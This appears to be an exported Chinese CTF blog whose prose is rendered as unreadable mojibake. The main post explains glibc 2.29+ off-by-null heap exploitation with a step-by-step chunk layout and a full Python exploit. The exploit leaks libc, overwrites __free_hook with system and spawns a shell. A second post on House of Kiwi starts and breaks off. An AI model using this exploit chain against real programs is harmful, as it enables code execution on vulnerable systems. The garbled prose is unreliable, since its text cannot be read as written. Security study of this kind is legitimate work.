å›¾çš„é€»è¾‘ï¼Œè¿›å…¥unlinkä¸­æ—¶preChunkçš„sizeä¸º0x100ï¼ŒpreChunkçš„nextChunkï¼Œå³overlapChunkçš„pre_sizeä¸º0x100ï¼Œç›¸ç­‰ï¼Œå¯ä»¥æ»¡è¶³è¦æ±‚ï¼Œæ²¡å•¥å¤§ç”¨ï¼Œä½†æ˜¯ä¹‹åæå‡ºçš„ç»•è¿‡æ‰‹æ®µä¹Ÿæ˜¯éœ€è¦ç»•è¿‡è¿™ä¸ªæ£€æŸ¥çš„ã€‚\n\n![Snipaste_2021-08-31_11-57-00](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831122206.png)\n\nâ–²åé¢çš„æ›´é«˜ç‰ˆæœ¬ï¼Œåˆ°2.33éƒ½æ²¡å˜åŒ–ï¼Œä¹Ÿå°±ä¸æäº†ã€‚åªæ˜¯2.32ä¸­çš„æŒ‡é’ˆå¼‚æˆ–å¯èƒ½éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œä½†æ˜¯ä¹‹åçš„ç»•è¿‡æ‰‹æ®µä¸€èˆ¬æ˜¯åŸºäºunsortedbinï¼Œsmallbinï¼Œlargebinæ¥ç»•è¿‡ï¼Œä¸å­˜åœ¨æŒ‡é’ˆå¼‚æˆ–çš„æƒ…å†µï¼Œæ‰€ä»¥ä¹Ÿä¸ç”¨å¤ªåœ¨æ„ã€‚\n\n# ä¸‰ã€é«˜ç‰ˆæœ¬èŠ±å¼ç»•è¿‡\n\nè¿™é‡Œå°†çš„æ˜¯2.29åŠä»¥ä¸Šçš„ç‰ˆæœ¬\n\n## ç¬¬ä¸€ç§\n\nè¿™ä¸ªä¹‹å‰å†™è¿‡ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š\n\n[2.29ä¸‹çš„off-by-null | PIG-007](https://www.pig-007.top/2021/08/14/2.29ä¸‹çš„off-by-null/)\n\næˆ–è€…t1an5gå¸ˆå‚…çš„æ–‡ç« ï¼š\n\nhttps://bbs.pediy.com/thread-257901.htm#msg_header_h2_2\n\nå½“ç„¶exå¸ˆå‚…çš„åŸå§‹è§£æä¹Ÿå¾ˆå¥½ï¼š\n\nhttp://blog.eonew.cn/archives/1233\n\nä½†æ˜¯è¿™ä¸ªéœ€è¦çˆ†ç ´åŠä¸ªå­—èŠ‚ï¼Œä¹Ÿä¸èƒ½å¯¹sizeåšå¤ªå¤šçš„é™åˆ¶ï¼Œä¸”chunkéœ€è¦ç”³è¯·å¤§æ¦‚æœ‰24ä¸ªï¼Œæ‰€ä»¥çœ‹ä¸ªäººéœ€è¦ã€‚\n\n## ç¬¬äºŒç§\n\nè¿™ä¸ªä¹Ÿå†™è¿‡ï¼Œå‚è€ƒè¿™ç¯‡ï¼š\n\n[2.29-2.32ä¸‹çš„off-by-null | PIG-007](https://www.pig-007.top/2021/08/14/2.29-2.32ä¸‹çš„off-by-null/)\n\nå½“ç„¶æˆ‘ä¹Ÿæ˜¯å‚è€ƒWJHå¸ˆå‚…çš„ï¼š\n\n[glibc 2.29-2.32 off by null bypass - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/236078)\n\nè¿™ä¸ªä¸éœ€è¦çˆ†ç ´ï¼Œä½†æ˜¯å¯¹sizeçš„é™åˆ¶ä¸èƒ½å¤ªä¸¥æ ¼ï¼Œéœ€è¦largebinçš„sizeã€‚\n\n## ç¬¬ä¸‰ç§\n\nè¿™ä¸ªè¿˜æ²¡å†™è¿‡æ€»ç»“ï¼Œç°åœ¨æ¥ï¼Œä¸è¿‡å…ˆè´´ä¸‹æ–‡ç« ï¼Œinit-0å¸ˆå‚…çš„ï¼š\n\n[å †æ¼æ´åˆ©ç”¨ï¼ˆ2.29ä»¥ä¸Šglibc,off-by-null, åŠ äº†ç”³è¯·sizeé™åˆ¶ï¼‰ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/231418#h3-8)\n\nè¿™ç§æ–¹æ³•åœ¨sizeé™åˆ¶ä¸‹ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œæ–‡ç« ä¸­çš„é™åˆ¶æ˜¯0xe8çš„å †å—ï¼ŒçœŸæ˜¯å°†å †å¸ƒå±€ç”¨åˆ°æé«˜çš„æ°´å¹³ã€‚\n\nâ–²å…ˆçœ‹æœ€ç»ˆçš„å¸ƒå±€æ•ˆæœï¼š\n\n![Snipaste_2021-08-31_18-42-42](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831184255.png)\n\nè¿™æ ·å°±èƒ½é€šè¿‡ä¸¤é¡¹æ£€æŸ¥äº†ï¼š\n\n```c\n//_int_freeä¸­\nif (__glibc_unlikely (chunksize(p) != prevsize))\n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n\n//unlinkä¸­\nif (chunksize (p) != prev_size (next_chunk (p)))\n    malloc_printerr (\"corrupted size vs. prev_size\");\n```\n\n\n\n### (1)å‰ç½®å¸ƒå±€ï¼š\n\nç”±äºinit-0å¸ˆå‚…çš„é¢˜ç›®ä¸­ï¼Œç”³è¯·chunkæ˜¯ä»0x3a0å¼€å§‹çš„ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘å°±ä¹Ÿä»¥0x3a0å¼€å§‹ï¼š\n\n```python\n#get layout to let chunk0_addr = 0x****3a0\nclaim(0x88)# 0-6\t\t\t#1-7\nclaim(0x98)# 7-13\t\t\t#8-14\nclaim(0xa8)# 14-20\t\t\t#15-21\nclaim(0xb8)# 21-27\t\t\t#22-28\nclaim(0xc8)# 28-34\t\t\t#29-35\nclaim(0xd8)# 35-41\t\t\t#36-42\nclaim(0xe8)# 42-48\t\t\t#43-49\n\n#--------------------------\nadd_malloc(0x98,'\\x00')# 49 \t\t\t\t#50\nadd_malloc(0x98,'\\x00')# 50 \t\t\t\t#51\t\t0x****f900\nadd_malloc(0x18,'\\x00')# 51  \t\t\t\t#52 \t0x****f9a0\nadd_malloc(0xa8,'\\x00')# 52     0 \t\t\t#53\t\t0x****f9c0\nadd_malloc(0xb8,'\\x00')# 53     1 \t\t\t#54\t\t0x****fa70\nadd_malloc(0xd8,'\\x00')# 54     2 \t\t\t#55\t\t0x****fb30\nadd_malloc(0xd8,'\\x00')# 55     \t\t\t#56\t\t\nadd_malloc(0xe8,'\\x00')# 56     3 \t\t\t#57\t\t0x****fcf0\n\n#è¿™ä¸ª0x200å’Œ0xe0çš„è®¾ç½®æ˜¯ä¸ºäº†ä¹‹åå°†unsortedbinChunkç»™æ”¹æˆ0x200å¤‡ç”¨çš„\nfakeChunk_nextChunk_preSize = p64(0x200) + p64(0xe0)\nedit(57,0x10,fakeChunk_nextChunk_preSize)# 56\t\t\t#57\n\nadd_malloc(0xe8,'\\x00')# 57    4 \t\t\t#58 \t0x****fde0\nadd_malloc(0x98,'\\x00')# 58 \t\t\t\t#59\nadd_malloc(0xe8,'\\x00')# 59 \t\t\t\t#60 \t0x****ff70\nadd_malloc(0x18,'\\x00')# 60 \t\t\t\t#61\n```\n\n### (2)å¡«å……tcache\n\nå¹¶ä¸”å°†è¦åˆ©ç”¨çš„Chunké‡Šæ”¾åˆå¹¶è¿›å…¥unsortedbin\n\n```python\n#free 0~48 \t\t#1~49\n#-------------------------\n#--tcache\nfor i in range(0,7):  #0x88  \t\n    free(i+1)\nfor i in range(14,21):#0xa8\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\nfor i in range(35,42):#0xd8\n    free(i+1)\nfor i in range(42,49):#0xe8\n    free(i+1)    \n#--tcache\n\nfor i in range(52,57): #52~56  \t\t\t\t#53~57  merge into unsortedbin\n    free(i+1)\n```\n\n![Snipaste_2021-08-31_19-41-25](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831194137.png)\n\n```mermaid\ngraph TD;\n    0(chunk53<br>0xa8<br>0x****9c0)-->1(chunk54<br>0xb8)-->2(chunk55<br>0xd8)-->3(chunk56<br>0xd8)-->4(chunk57<br>0xe8<br>0x****cf0)\n```\n\n### (3)é‡æ„53~57ç»“æ„ä¸º97~101\n\n```python\n#---------------------------\n# empty tcache\nclaim(0x88) #62~68\nclaim(0xa8) #69~75\nclaim(0xb8) #76~82\nclaim(0xd8) #83~89\nclaim(0xe8) #90~96\n#---------------------------\n\n#---------------------------------------------------------------- ä¸Šé¢æ˜¯ä¸€ä¸ªå¤§çš„unsorted bin\n#è¿›è¡Œaddä¹‹åcarver up and unsortedbin è¢«æ”¾å…¥äº†largebin ä¹‹åè¿›è¡Œäº†åˆ†é…\nadd_malloc(0x98,'\\x00')# 52 \t#97  \t#0x****9c0\nadd_malloc(0x98,'\\x00')# 53     #98\t\t#0x****A60\n\nfake_chunk_size = 0x98 * \"a\" + p16(0x200)\n#è¿™é‡Œæˆ‘å€Ÿç”¨å †æº¢å‡ºæ¥ä»¿ç…§off-by-nullï¼Œä¿®æ”¹è¿˜åœ¨largebinä¸­çš„chunkçš„sizeä»0x2e1->0x200\n#changing largebinChunk_size will not cause abort\nedit(98,0x98+0x2,fake_chunk_size)#53 #98\nadd_malloc(0x88,'\\x00')#54 \t#99 \t#0x****B00\nadd_malloc(0x88,'\\x00')#55  #100 \t#0x****B90\nadd_malloc(0xd8,'\\x00')#56  #101 \t#0x****C70\n```\n\né‡æ„ä¹‹åå¦‚ä¸‹\n\n```mermaid\ngraph TD;\n    0(chunk97<br>0x98<br>0x****9c0)-->1(chunk98<br>0x98)-->2(chunk99<br>0x88)-->3(chunk100<br>0x88)-->4(chunk101<br>0xd8<br>0x****cf0)-->5(0xe0ç¢ç‰‡)\n```\n\né‚£ä¹ˆå®é™…ä¸Šå…¶å®åŸå…ˆçš„0x420è¢«ç”³è¯·äº†0x340ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†0xe0æ²¡æœ‰è¢«ç”³è¯·å‡ºæ¥ã€‚\n\n![Snipaste_2021-08-31_20-07-33](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831200742.png)\n\n### (4)æ„é€ preChunkçš„fdå’Œbk\n\n```python\n#------tcache\nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(0,7):#0x88\n    free(i+1)\nfor i in range(42,49):#0xe8\n    free(i+1)        \n#------tcache\n\n\nfree(51)#0x98 \t#50  \t#51 #0x****f900\n#let 99->fd = chunk51_addr(0x****f900)\nfree(99)#0x88  \t#54 \t#99\n#let 99->bk = chunk60_addr(0x****ff70)\nfree(60)#0xe8 \t#59 \t#60 #0x****ff70\n```\n\n\n\n![Snipaste_2021-08-31_20-40-24](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831204034.png)\n\n### (5)å†é‡æ„97~101ä¸º97->124->132->134\n\n```python\nfree(98)#0x98 \t#53 \t#98\n\n#---------------add back\nclaim(0x88) #102~108\nclaim(0x98) #109~115\nclaim(0xe8) #116~122\n#---------------add back\n\n#å°†51,99,98åˆ†åˆ«æ”¾å…¥å¯¹åº”çš„smallbin,98å’Œ99ç”±äºç‰©ç†ç›¸é‚»ï¼Œæ‰€ä»¥åˆå¹¶æˆä¸º0x130çš„å—\n#ä¹‹åä¾æ®å¤§å°é€‚é…åŸåˆ™å°†60åˆ†é…å›æ¥ç»™123\nadd_malloc(0xd8,'\\x00')# 0x32\t\t#123 0x****ff70,å®é™…å¤§å°ä¸º0xf0\n#å°†0x131çš„smallbinåˆ‡åˆ†ï¼Œæ­¤æ—¶51è¿˜åœ¨0xa0çš„smallbinä¸­ï¼Œå‰©ä¸‹0x70çš„Chunkè¿›å…¥unsortedbinä¸­\nadd_malloc(0xb8,'\\x00')# 0x35  \t\t#124 0x****fa60\n\nfor i in range(0,7):#0x88\n    free(i+1)\n#chunk100æ”¾å…¥unsortedbin, ä¸0x70çš„ç¢ç‰‡åˆå¹¶ï¼Œå½¢æˆ0x101çš„å—\nfree(100) \t\t\t#55 \t#100\n\nclaim(0x88)\t#125~131\n\n#åˆ‡å‰²0x101çš„å—ï¼Œè·å¾—0xb8å¤§å°çš„0x****fb20ï¼Œæ–¹ä¾¿ä¸0x****f900çš„å—æ”¾å…¥åŒä¸€ä¸ªunsortebinä¸­\nadd_malloc(0xb8,'\\x00')#0x36 \t#132 \t0x****fb20\nadd_malloc(0x98,'\\x00')#0x37  \t#133\t0x****f900\nadd_malloc(0x38,'\\x00')#0x3b \t#134 \t0x****fbe0\n```\n\né‡æ„ä¹‹åå¦‚ä¸‹\n\n```mermaid\ngraph TD;\n    0(chunk97<br>0x98<br>0x****f9c0)-->1(chunk124<br>0xb8<br>chunk99è¢«åŒ…å«<br>0x****fa60)-->2(chunk132<br>0xb8<br>0x****fb20)-->3(chunk134<br>0x38<br>0x****fbe0)-->4(0xe0ç¢ç‰‡)\n```\n\n### (6)ä¿®å¤FD->bkå’ŒBK->fd\n\n```python\n#------tcache\nfor i in range(42,49):#0xe8\n    free(i+1)        \nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\n#------tcache\n\n#let 133->bk = chunk132_addr(0x****f900->bk = 0x****fb20)\nfree(133) #0x37 \t#133 \t0x****f900\nfree(132) #0x36  \t#132 \t0x****fb20\n#let 123->fd = chunk132_addr(0x****ff70->bk = 0x****fb20)\nfree(123) #0x32 \t#123  \t0x****ff70\n```\n\n### (7)å†é‡æ„ä¸º97->124->157->134 \n\næ–¹ä¾¿å°†`0x****ff70`å’Œ`0x****f900`çš„å¯¹äºfd,bkè¿›è¡Œoff-by-nullï¼Œä½¿å¾—0xb20å˜ä¸º0xb00ã€‚\n\n```python\nfree(59)  #58\t\t#59\t\t0x****fed0\n#chunk59å’Œchunk123åˆå¹¶è¿›å…¥unsortedbinï¼Œå¤§å°0x190(0xf0+0xa0)\n\nclaim(0x98) \t#135~141\nclaim(0xb8)\t\t#142~148\nclaim(0xe8) \t#149~155\n\nadd_malloc(0xc8,'\\x00')\t\t#0x32 \t\t#156 \t0x****fed0\t\nadd_malloc(0xb8,'\\x00')\t\t#0x36 \t\t#157 \t0x****fb20\nadd_malloc(0xb8,'\\x00')\t\t#0x37  \t\t#158\t0x****ffa0\nadd_malloc(0x98,'\\x00')\t\t#58  \t\t#159 \t0x****f900\n\n#--top_chunk\nadd_malloc(0x98,'\\x00')        #0x3d \t\t\t#160\nadd_malloc(0x98,'\\x00')        #0x3e \t\t\t#161\nadd_malloc(0x18,'\\x00')        #0x3f \t\t\t#162\n\n#------tcache\nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\n#------tcache\n\n\nfree(161) #0x98 \t#0x3e \t\t#161\nfree(159) #0x98 \t#58  \t\t#159 \t0x****f900\nfree(157) #0xb8 \t#0x36 \t\t#157\nfree(50)  #0x98 \t#49 \t\t#50 \t0x****f860\n#å…¶ä¸­159å’Œ50åˆå¹¶ä¸º0x140å¤§å°çš„å—æ”¾å…¥unsortedbinä¸­\n#unsortedbin:0x****f860 â€”â–¸ 0x****fb20 â€”â–¸ 0x****0120\n\nclaim(0xb8) #163~169\nclaim(0x98) #170~176\n#----------------------------------------------------\nadd_malloc(0xb8,'\\x00') #49 \t#177\nadd_malloc(0x98,'\\x00') #0x36  \t#178\n\n#åˆ‡å‰²0x140çš„å—\nadd_malloc(0xc8,'\\x00')#0x3a \t#179 \t0x****f860\nadd_malloc(0x68,'\\x00')#0x3e   \t#180 \t\n```\n\nç°åœ¨å°±å¯ä»¥é€šè¿‡chunk179æ¥å°†`0x****f900`ä¸­çš„bkç»™æ”¹æ‰ã€‚\n\né€šè¿‡chunk156æ¥å°†`0x****ff70`ä¸­çš„fdç»™æ”¹æ‰ã€‚\n\n### (8)åˆ©ç”¨off-by-nullå¾—åˆ°æœ€ç»ˆå¸ƒå±€\n\n```python\npartial_null_write = 0x98*'b'\npartial_null_write += p64(0xf1)\nedit(156,0x98+0x8+0x1,partial_null_write+'\\x00') #0x32  \t#156\n\npartial_null_write = 0xa8*'c'\nedit(179,0xa8+0x1,partial_null_write + '\\x00') \t\t#0x3a \t\t#179\n\n#ä¼ªé€ pre_size\nfake_chunk_size = 0x98*'d'\nfake_chunk_size += p64(0x2e1)\nedit(124,0x98+0x8,fake_chunk_size) \t#0x35 \t#124\n```\n\n### (9)è§¦å‘off-by-null\n\n```python\nfor i in range(42,49):#0xe8\n    free(i+1)    \nfree(58)\n```\n\n### â–²æ€»ç»“\n\nâ‘ åˆ©ç”¨unsortedbinæˆé“¾æœºåˆ¶ï¼Œåˆå¹¶unsortedbinä¸­çš„chunkå¹¶ä¸”åˆ‡å‰²ï¼Œè¿™æ ·å°±èƒ½ä¿ç•™ä½FDå’ŒBKäº†ã€‚\n\nâ‘¡å†åˆ©ç”¨unsortedbinæˆé“¾å’Œåˆ‡å‰²çš„æœºåˆ¶ï¼Œå°±èƒ½ä¿®æ”¹åˆ°å¯¹åº”preChunkçš„FDå’ŒBKäº†ï¼Œä¿®æ”¹æœ€åä¸€ä¸ªå­—èŠ‚ä¸º\\x00å³å¯ã€‚\n\nâ‘¢ç”±äº2.29ä¹‹åçš„æ·»åŠ çš„ä¸¤é¡¹æ£€æŸ¥ï¼Œæ‰€ä»¥éœ€è¦æ³¨æ„çš„æ˜¯ä¼ªé€ unsortedbinChunkçš„sizeæ—¶ï¼Œä¹Ÿè¦ä¼ªé€ nextChunkçš„pre_sizeå’Œpre_inuseä½ã€‚\n\nâ‘£å¤ªä»–ä¸«çš„éº»çƒ¦äº†ï¼Œæœ‰è¿™æ—¶é—´å¸ƒå±€è¿˜ä¸å¦‚è‚å…¶ä»–é¢˜.....\n\nå†è´´ä¸ªæ±‡æ€»çš„expï¼ŒåŸºäºlibc2.30ï¼Œè‡ªå·±çš„é¢˜ç›®ï¼š\n\n```python\n#æœ‰sizeé™åˆ¶ï¼Œå¯¹åº”ç´¢å¼•å¾€åç§»å³å¯\nadd_malloc(0x1000-0x290+0x3000-0x8+0x3a0,'PIG007NB')\n\n\t\t\t#old \t\t\t#new\n#get layout to let chunk0_addr = 0x****3a0\nclaim(0x88)# 0-6\t\t\t#1-7\nclaim(0x98)# 7-13\t\t\t#8-14\nclaim(0xa8)# 14-20\t\t\t#15-21\nclaim(0xb8)# 21-27\t\t\t#22-28\nclaim(0xc8)# 28-34\t\t\t#29-35\nclaim(0xd8)# 35-41\t\t\t#36-42\nclaim(0xe8)# 42-48\t\t\t#43-49\n\n#--------------------------\nadd_malloc(0x98,'\\x00')# 49 \t\t\t\t#50\nadd_malloc(0x98,'\\x00')# 50 \t\t\t\t#51\t\t0x****f900\nadd_malloc(0x18,'\\x00')# 51  \t\t\t\t#52 \t0x****f9a0\nadd_malloc(0xa8,'\\x00')# 52     0 \t\t\t#53\t\t0x****f9c0\nadd_malloc(0xb8,'\\x00')# 53     1 \t\t\t#54\t\t0x****fa70\nadd_malloc(0xd8,'\\x00')# 54     2 \t\t\t#55\t\t0x****fb30\nadd_malloc(0xd8,'\\x00')# 55     \t\t\t#56\t\t\nadd_malloc(0xe8,'\\x00')# 56     3 \t\t\t#57\t\t0x****fcf0\n\n#è¿™ä¸ª0x200å’Œ0xe0çš„è®¾ç½®æ˜¯ä¸ºäº†ä¹‹åå°†unsortedbinChunkç»™æ”¹æˆ0x200å¤‡ç”¨çš„\nfakeChunk_nextChunk_preSize = p64(0x200) + p64(0xe0)\nedit(57,0x10,fakeChunk_nextChunk_preSize)# 56\t\t\t#57\n\nadd_malloc(0xe8,'\\x00')# 57    4 \t\t\t#58 \t0x****fde0\nadd_malloc(0x98,'\\x00')# 58 \t\t\t\t#59\nadd_malloc(0xe8,'\\x00')# 59 \t\t\t\t#60 \t0x****ff70\nadd_malloc(0x18,'\\x00')# 60 \t\t\t\t#61\n\n#free 0~48 \t\t#1~49\n#-------------------------\n#--tcache\nfor i in range(0,7):  #0x88  \t\n    free(i+1)\nfor i in range(14,21):#0xa8\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\nfor i in range(35,42):#0xd8\n    free(i+1)\nfor i in range(42,49):#0xe8\n    free(i+1)    \n#--tcache\n\nfor i in range(52,57): #52~56  \t\t\t\t#53~57  merge into unsortedbin\n    free(i+1)\n\n#---------------------------\n# empty tcache\nclaim(0x88) #62~68\nclaim(0xa8) #69~75\nclaim(0xb8) #76~82\nclaim(0xd8) #83~89\nclaim(0xe8) #90~96\n#---------------------------\n\n#---------------------------------------------------------------- ä¸Šé¢æ˜¯ä¸€ä¸ªå¤§çš„unsorted bin\n#è¿›è¡Œaddä¹‹åcarver up and unsortedbin è¢«æ”¾å…¥äº†largebin ä¹‹åè¿›è¡Œäº†åˆ†é…\nadd_malloc(0x98,'\\x00')# 52 \t#97  \t#0x****9c0\nadd_malloc(0x98,'\\x00')# 53     #98\t\t#0x****A60\n\nfake_chunk_size = 0x98 * \"a\" + p16(0x200)\n#è¿™é‡Œæˆ‘å€Ÿç”¨å †æº¢å‡ºæ¥ä»¿ç…§off-by-nullï¼Œä¿®æ”¹è¿˜åœ¨largebinä¸­çš„chunkçš„sizeä»0x2e1->0x200\n#changing largebinChunk_size will not cause abort\nedit(98,0x98+0x2,fake_chunk_size)#53 #98\nadd_malloc(0x88,'\\x00')#54 \t#99 \t#0x****B00\nadd_malloc(0x88,'\\x00')#55  #100 \t#0x****B90\nadd_malloc(0xd8,'\\x00')#56  #101 \t#0x****C70\n\n\n#æ„é€ preChunkçš„fdå’Œbk------------------------\n#------tcache\nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(0,7):#0x88\n    free(i+1)\nfor i in range(42,49):#0xe8\n    free(i+1)        \n#------tcache\n\n\nfree(51)#0x98 \t#50  \t#51 #0x****f900\n#let 99->fd = chunk51_addr(0x****f900)\nfree(99)#0x88  \t#54 \t#99\n#let 99->bk = chunk60_addr(0x****ff70)\nfree(60)#0xe8 \t#59 \t#60 #0x****ff70\n#æ„é€ preChunkçš„fdå’Œbk------------------------\n\n\nfree(98)#0x98 \t#53 \t#98\n\n#---------------add back\nclaim(0x88) #102~108\nclaim(0x98) #109~115\nclaim(0xe8) #116~122\n#---------------add back\n\n#å°†51,99,98åˆ†åˆ«æ”¾å…¥å¯¹åº”çš„smallbin,98å’Œ99ç”±äºç‰©ç†ç›¸é‚»ï¼Œæ‰€ä»¥åˆå¹¶æˆä¸º0x130çš„å—\n#ä¹‹åä¾æ®å¤§å°é€‚é…åŸåˆ™å°†60åˆ†é…å›æ¥ç»™123\nadd_malloc(0xd8,'\\x00')# 0x32\t\t#123 0x****ff70,å®é™…å¤§å°ä¸º0xf0\n#å°†0x131çš„smallbinåˆ‡åˆ†ï¼Œæ­¤æ—¶51è¿˜åœ¨0xa0çš„smallbinä¸­ï¼Œå‰©ä¸‹0x70çš„Chunkè¿›å…¥unsortedbinä¸­\nadd_malloc(0xb8,'\\x00')# 0x35  \t\t#124 0x****fa60\n\nfor i in range(0,7):#0x88\n    free(i+1)\n#chunk100æ”¾å…¥unsortedbin, ä¸0x70çš„ç¢ç‰‡åˆå¹¶ï¼Œå½¢æˆ0x101çš„å—\nfree(100) \t\t\t#55 \t#100\n\nclaim(0x88)\t#125~131\n\n#åˆ‡å‰²0x101çš„å—ï¼Œè·å¾—0xb8å¤§å°çš„0x****fb20ï¼Œæ–¹ä¾¿ä¸0x****f900çš„å—æ”¾å…¥åŒä¸€ä¸ªunsortebinä¸­\nadd_malloc(0xb8,'\\x00')#0x36 \t#132 \t0x****fb20\nadd_malloc(0x98,'\\x00')#0x37  \t#133\t0x****f900\nadd_malloc(0x38,'\\x00')#0x3b \t#134 \t0x****fbe0\n\n\n#ä¿®å¤FD->bkå’ŒBK->fd-----------------------------\n#------tcache\nfor i in range(42,49):#0xe8\n    free(i+1)        \nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\n#------tcache\n\n#let 133->bk = chunk132_addr(0x****f900->bk = 0x****fb20)\nfree(133) #0x37 \t#133 \t0x****f900\nfree(132) #0x36  \t#132 \t0x****fb20\n#let 123->fd = chunk132_addr(0x****ff70->bk = 0x****fb20)\nfree(123) #0x32 \t#123  \t0x****ff70\n#ä¿®å¤FD->bkå’ŒBK->fd-----------------------------\n\n\nfree(59)  #58\t\t#59\t\t0x****fed0\n#chunk59å’Œchunk123åˆå¹¶è¿›å…¥unsortedbinï¼Œå¤§å°0x190(0xf0+0xa0)\n\nclaim(0x98) \t#135~141\nclaim(0xb8)\t\t#142~148\nclaim(0xe8) \t#149~155\n\nadd_malloc(0xc8,'\\x00')\t\t#0x32 \t\t#156 \t0x****fed0\t\nadd_malloc(0xb8,'\\x00')\t\t#0x36 \t\t#157 \t0x****fb20\nadd_malloc(0xb8,'\\x00')\t\t#0x37  \t\t#158\t0x****ffa0\nadd_malloc(0x98,'\\x00')\t\t#58  \t\t#159 \t0x****f900\n\n#--top_chunk\nadd_malloc(0x98,'\\x00')        #0x3d \t\t\t#160\nadd_malloc(0x98,'\\x00')        #0x3e \t\t\t#161\nadd_malloc(0x18,'\\x00')        #0x3f \t\t\t#162\n\n#------tcache\nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\n#------tcache\n\n\nfree(161) #0x98 \t#0x3e \t\t#161\nfree(159) #0x98 \t#58  \t\t#159 \t0x****f900\nfree(157) #0xb8 \t#0x36 \t\t#157\nfree(50)  #0x98 \t#49 \t\t#50 \t0x****f860\n#å…¶ä¸­159å’Œ50åˆå¹¶ä¸º0x140å¤§å°çš„å—æ”¾å…¥unsortedbinä¸­\n#unsortedbin:0x****f860 â€”â–¸ 0x****fb20 â€”â–¸ 0x****0120\n\nclaim(0xb8) #163~169\nclaim(0x98) #170~176\n#----------------------------------------------------\nadd_malloc(0xb8,'\\x00') #49 \t#177\nadd_malloc(0x98,'\\x00') #0x36  \t#178\n\n#åˆ‡å‰²0x140çš„å—\nadd_malloc(0xc8,'\\x00')#0x3a \t#179 \t0x****f860\nadd_malloc(0x68,'\\x00')#0x3e   \t#180 \t\n\n\npartial_null_write = 0x98*'b'\npartial_null_write += p64(0xf1)\nedit(156,0x98+0x8+0x1,partial_null_write+'\\x00') #0x32  \t#156\n\npartial_null_write = 0xa8*'c'\nedit(179,0xa8+0x1,partial_null_write + '\\x00') \t\t#0x3a \t\t#179\n\n#ä¼ªé€ pre_size\nfake_chunk_size = 0x98*'d'\nfake_chunk_size += p64(0x2e1)\nedit(124,0x98+0x8,fake_chunk_size) \t#0x35 \t#124\n\n\nfor i in range(42,49):#0xe8\n    free(i+1)    \nfree(58)\n\n\n#pull-down the unsortedbinChunk to chunk134 and leak main_arena\nedit(134,0x8,\"e\"*8)  #0x3b #134\nadd_malloc(0xd8,'\\x00') \t#181\nshow(134)\n\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['__malloc_hook'] + 0x10)\nlg('libc_base',libc_base)\n\n\n#---------------------------------------------------------------------------------\nclaim(0xe8) \t#182~188\nadd_malloc(0xe8,'\\x00')\t\t#0x40 \t#189\nfree(44) \t#0x2b \t#44\nfree(134) \t#0x3b \t#134\nedit(189,0x8,p64(libc_base+libc.sym['__free_hook']-8)) \t#0x40 \t#189\nadd_malloc(0xe8,'\\x00')  \t\t#190\nadd_malloc(0xe8,'\\x00') \t\t#191\n\nedit(191,0x10,\"/bin/sh\\x00\"+p64(libc_base+libc.sym['system'])) \t#191\nfree(191)\nit()\n#--------------------------------------------------------------\n```\n\n","tags":["off-by-null"],"categories":["PWN","pwnå †-off-by-null"]},{"title":"é«˜ç‰ˆæœ¬å„ç±»å †æŠ€å·§æ€»ç»“","url":"/2021/08/20/é«˜ç‰ˆæœ¬å †å„ç±»æŠ€å·§æ€»ç»“/","content":"\n# ä¸€ã€House of KIWI\n\n[House OF Kiwi - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/235598)\n\n## 1.åŸç†åˆ†æ\n\nå‡½æ•°è°ƒç”¨é“¾ï¼š**assert->malloc_assert->fflush->_IO_file_jumpsç»“æ„ä½“ä¸­çš„__IO_file_sync**\n\n```c\nstatic void\n__malloc_assert (const char *assertion, const char *file, unsigned int line,\n\t\t const char *function)\n{\n  (void) __fxprintf (NULL, \"%s%s%s:%u: %s%sAssertion `%s' failed.\\n\",\n\t\t     __progname, __progname[0] ? \": \" : \"\",\n\t\t     file, line,\n\t\t     function ? function : \"\", function ? \": \" : \"\",\n\t\t     assertion);\n  fflush (stderr);//å…³é”®åœ¨è¿™ä¸ªå‡½æ•°ä¸­\n  abort ();\n}\n#endif\n```\n\nè°ƒç”¨æ—¶çš„å¯„å­˜å™¨ä¸ºï¼š\n\n![å›¾ç‰‡2](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827170019.png)\n\né‚£ä¹ˆå¦‚æœå¯ä»¥åœ¨ä¸åŒç‰ˆæœ¬ä¸‹åŠ«æŒå¯¹åº”setcontextä¸­çš„èµ‹å€¼å‚æ•°ï¼Œå³rdiæˆ–è€…rdxï¼Œå°±å¯ä»¥è®¾ç½®å¯„å­˜å™¨æ¥è°ƒç”¨æˆ‘ä»¬æƒ³è°ƒç”¨çš„å‡½æ•°ã€‚\n\n### (1)rdiå’Œrdxäº’ç›¸è½¬æ¢\n\nâ‘ getkeyserv_handle+576ï¼š\n\n```\nplaintext\n\n#æ³¨é‡Šå¤´\n\nmov rdx, [rdi+8]\nmov [rsp+0C8h+var_C8], rax\ncall qword ptr [rdx+20h]\n```\n\né€šè¿‡rdiæ§åˆ¶rdxï¼ŒåŒæ ·2.29ä»¥åä¸åŒç‰ˆæœ¬éƒ½ä¸å¤ªä¸€æ 